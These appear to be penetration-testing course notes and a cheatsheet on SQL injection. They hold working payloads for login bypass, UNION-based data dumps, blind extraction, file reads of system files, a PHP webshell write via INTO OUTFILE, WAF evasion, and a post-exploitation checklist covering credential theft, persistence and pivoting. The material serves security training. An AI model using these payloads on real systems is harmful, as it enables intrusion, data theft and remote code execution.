---
title: SQL Injection
tags: [module]
---

## Notes

### SQL Fundamentals (MySQL)
Before exploiting SQLi you need to think in SQL. The core statements that come up repeatedly in exploitation:

**SELECT** — the query you're hijacking. Returns rows.
```sql
SELECT * FROM logins;
SELECT username, password FROM logins WHERE id > 1;
```

**INSERT / UPDATE / DROP / ALTER** — these matter when injection lands in a non-SELECT query (signup forms, profile updates). A stacked query via `;` can let you insert a privileged user.

**ORDER BY** — critical for UNION-based injection. Sorts results by a column number or name. Error on an out-of-range column tells you how many columns the real query returns.

**LIMIT / WHERE / LIKE** — useful when the output is restricted to a single row and you need to reach specific data.

### Comments
Injected payloads usually need to terminate the original query. Comments are how you do that.

- `--` or `#` — single-line comments in MySQL
- `/* ... */` — multi-line

**Gotcha:** `--` on its own isn't a comment. MySQL requires whitespace or a non-identifier character after it. In a URL where spaces get encoded to `+`, the safest form is `-- -` (dash space dash). Likewise, `#` in a URL is a fragment marker — URL-encode it as `%23`.

### Detecting SQLi
Three families of indicators tell you input is reaching a query:

1. **Error-based** — single quote `'` or double quote `"` causes a database error
2. **Boolean** — `' AND 1=1-- -` vs `' AND 1=2-- -` returns different pages
3. **Time-based** — `' OR SLEEP(5)-- -` delays the response measurably

Start with `'`, `"`, `)`, `')`, `")` — these break the most common string contexts. If nothing happens, try numeric contexts without quotes.

### Authentication Bypass
The classic. If the backend query is:
```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

Inject into the username field:
```
admin'-- -
```
Result:
```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='...'
```
→ Logs in as `admin`, password check commented out.

Or in an invitation-code field:
```
' OR '1'='1
```
→ Always returns rows. Any input validation that checks "did we get a row?" passes.

### UNION-Based Injection
The heavyweight technique when you want to extract data from other tables. Two prerequisites:

**Rule 1 — equal column count.** `UNION` fails if the two SELECT statements return different column counts.

**Rule 2 — compatible data types.** Columns being UNIONed need compatible types (or `NULL`, which fits everywhere).

**Step 1 — Count the columns.** Two ways:

Using `ORDER BY`:
```sql
' ORDER BY 1-- -     → success
' ORDER BY 2-- -     → success
' ORDER BY 3-- -     → "Unknown column '3' in 'order clause'"
```
→ Original query has 2 columns.

Using `UNION`:
```sql
' UNION SELECT 1-- -           → wrong column count
' UNION SELECT 1,2-- -         → wrong column count
' UNION SELECT 1,2,3-- -       → output appears
```
→ 3 columns.

**Step 2 — Find displayed columns.** The query returns all columns but the app may only print some.
```sql
' UNION SELECT 1,2,3-- -
```
If `2` and `3` appear on the page but not `1`, put your real payload only in columns 2 and 3:
```sql
' UNION SELECT NULL, username, password FROM users-- -
```

### Database Fingerprinting
Different DBs have different syntax. Fingerprint before you commit to payloads.

| DB | Version query | String concat |
|---|---|---|
| MySQL | `SELECT @@version` | `CONCAT('a','b')` |
| MSSQL | `SELECT @@version` | `'a'+'b'` |
| PostgreSQL | `SELECT version()` | `'a'||'b'` |
| Oracle | `SELECT banner FROM v$version` | `'a'||'b'` |

### Reading Files via SQLi (MySQL)
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -
```

Prerequisites: FILE privilege on the DB user, and target path not restricted by `secure_file_priv` (check with `SHOW VARIABLES LIKE 'secure_file_priv'`).

Useful reads for web attacks:
- `/etc/apache2/apache2.conf` — find `DocumentRoot`
- `/etc/nginx/nginx.conf` or `/etc/nginx/sites-enabled/default` — find `root`
- `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` — IIS

Once you know the web root, you know where to drop a shell.

### Writing Files / Webshell via SQLi (MySQL)
```sql
' UNION SELECT 1, "<?php system($_GET['c']); ?>", 3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

Prerequisites: FILE privilege, write access to the target directory, and knowing the web root. Fallback if config read fails: fuzz common roots (`/var/www/html/`, `/srv/www/`, `/usr/share/nginx/html/`).

### Blind SQLi — Boolean Based
No error, no visible output — but the page content changes based on query truth. Extract data one bit at a time:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -
```
If the "normal" page renders, the first char is `a`. Automate with Burp Intruder cluster bomb or a Python script.

### Blind SQLi — Time Based
Even content doesn't differ — but response time does:
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(3), 0)-- -
```
3 second delay → first char is `a`. Slower but works against the strictest interfaces.

### WAF and Filter Bypass
When basic payloads get blocked, try:

- **Case toggling** — `SeLeCt`, `uNiOn`
- **Keyword doubling** — `SELSELECTECT` (filters that strip one occurrence)
- **Whitespace swap** — `%09` (tab), `%0a` (newline), `/**/` (inline comment)
- **Function alternatives** — `IF()` vs `CASE WHEN`, `SLEEP()` vs `BENCHMARK()`
- **Hex encoding** — `0x61646D696E` instead of `'admin'`
- **Scientific notation** — `1e0=1` for comparisons
- **Nested comment** — `/*!50000SELECT*/` (MySQL version-specific SQL)

## Cheatsheet

### Detection Payloads
```sql
'
"
')
")
' OR 1=1-- -
' AND 1=1-- -
' AND 1=2-- -
' OR SLEEP(5)-- -
```

### Authentication Bypass
```sql
admin'-- -
admin'#
' OR '1'='1
' OR 1=1-- -
' OR 1=1 LIMIT 1-- -
" OR ""="
```

### Comments (MySQL)
```sql
-- -        (dash dash space dash — URL safe)
#           (URL encode as %23)
/* ... */   (block comment)
```

### Finding Column Count
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 10-- -
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
```

### Fingerprinting
```sql
' UNION SELECT @@version, NULL, NULL-- -           (MySQL/MSSQL)
' UNION SELECT version(), NULL, NULL-- -           (PostgreSQL)
' UNION SELECT banner, NULL, NULL FROM v$version-- - (Oracle)
' UNION SELECT @@hostname, @@datadir, NULL-- -
```

### Database / Schema Enumeration (MySQL)
```sql
' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata-- -
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username, password, NULL FROM users-- -
```

### MSSQL Enumeration
```sql
' UNION SELECT name, NULL, NULL FROM master..sysdatabases-- -
' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U'-- -
```

### PostgreSQL Enumeration
```sql
' UNION SELECT datname, NULL, NULL FROM pg_database-- -
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables-- -
```

### Reading Files (MySQL)
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -
' UNION SELECT 1, LOAD_FILE('/etc/apache2/apache2.conf'), 3-- -
' UNION SELECT 1, LOAD_FILE(0x2f6574632f706173737764), 3-- -     (hex path)
```

### Writing a Webshell (MySQL)
```sql
' UNION SELECT 1, "<?php system($_GET['c']); ?>", 3 INTO OUTFILE '/var/www/html/s.php'-- -
' UNION SELECT NULL, 0x3c3f706870207379... INTO OUTFILE '/var/www/html/s.php'-- -
```

### Boolean-Blind Extraction
```sql
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- -
```

### Time-Based Blind
```sql
' AND IF(1=1, SLEEP(3), 0)-- -
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)-- -
'; WAITFOR DELAY '0:0:5'-- -       (MSSQL)
'; SELECT pg_sleep(5)-- -           (PostgreSQL)
```

### WAF Bypass
```
SeLeCt                     -- case
SEL/**/ECT                 -- inline comment
UNION%09SELECT             -- tab
UNION%0ASELECT             -- newline
UNIunionON                 -- keyword doubling
/*!50000SELECT*/           -- MySQL version comment
0x61646D696E               -- hex literal
```

### Common Config Paths to Read
```
/etc/passwd
/etc/shadow                (usually unreadable)
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/mysql/my.cnf
/var/log/apache2/access.log
```

## Checklist

### Detection Phase
- [ ] Identify every parameter that reaches a query (GET, POST, cookies, headers)
- [ ] Test each with `'` — look for SQL error messages
- [ ] Test with `' AND 1=1-- -` vs `' AND 1=2-- -` (boolean detection)
- [ ] Test with `' OR SLEEP(5)-- -` (time-based detection)
- [ ] Test numeric contexts without quotes (`1 AND 1=1` vs `1 AND 1=2`)
- [ ] Try different string terminators: `'`, `"`, `)`, `')`, `")`

### Fingerprinting
- [ ] Identify the DBMS (MySQL / MSSQL / PostgreSQL / Oracle / SQLite)
- [ ] Get version string
- [ ] Identify current user and privileges
- [ ] Check for stacked query support (`;`)

### UNION Exploitation
- [ ] Count columns with `ORDER BY` incrementing until error
- [ ] Confirm column count with `UNION SELECT 1,2,3,...`
- [ ] Identify which column positions are displayed on the page
- [ ] Enumerate databases via `information_schema.schemata`
- [ ] Enumerate tables in target DB via `information_schema.tables`
- [ ] Enumerate columns in target table via `information_schema.columns`
- [ ] Dump data from interesting tables (users, credentials, api_keys)

### Authentication Bypass
- [ ] Try `admin'-- -` in username field
- [ ] Try `' OR '1'='1` in password field
- [ ] Try `' OR 1=1 LIMIT 1-- -` (limits to first user, often admin)
- [ ] Try payload variants for different quote types

### Blind Exploitation
- [ ] Boolean-blind: extract DB name char by char using `SUBSTRING()`
- [ ] Time-based: use `IF(...,SLEEP(N),0)` when no content difference exists
- [ ] Script extraction via Burp Intruder or custom script (don't do it by hand)

### File System Attacks
- [ ] Check FILE privilege: `SELECT * FROM mysql.user WHERE user=current_user()`
- [ ] Check `secure_file_priv` restrictions
- [ ] Read `/etc/passwd` to confirm file-read works
- [ ] Read web server config to find DocumentRoot
- [ ] Attempt webshell write via `INTO OUTFILE`
- [ ] Trigger shell via HTTP request

### WAF Encountered
- [ ] Case-toggling (`SeLeCt`)
- [ ] Inline comments (`SEL/**/ECT`)
- [ ] Whitespace alternatives (`%09`, `%0a`)
- [ ] Keyword doubling (`UNIunionON`)
- [ ] Hex encoding for strings
- [ ] MySQL version comments (`/*!50000SELECT*/`)
- [ ] If stuck, switch to SQLMap with `--tamper` scripts

### Post-Exploitation
- [ ] Dump password hashes for offline cracking
- [ ] Look for reused credentials (SSH, RDP, cloud)
- [ ] Hunt for API keys, tokens, secrets in app config tables
- [ ] If RCE achieved: escalate to full shell, persist, pivot
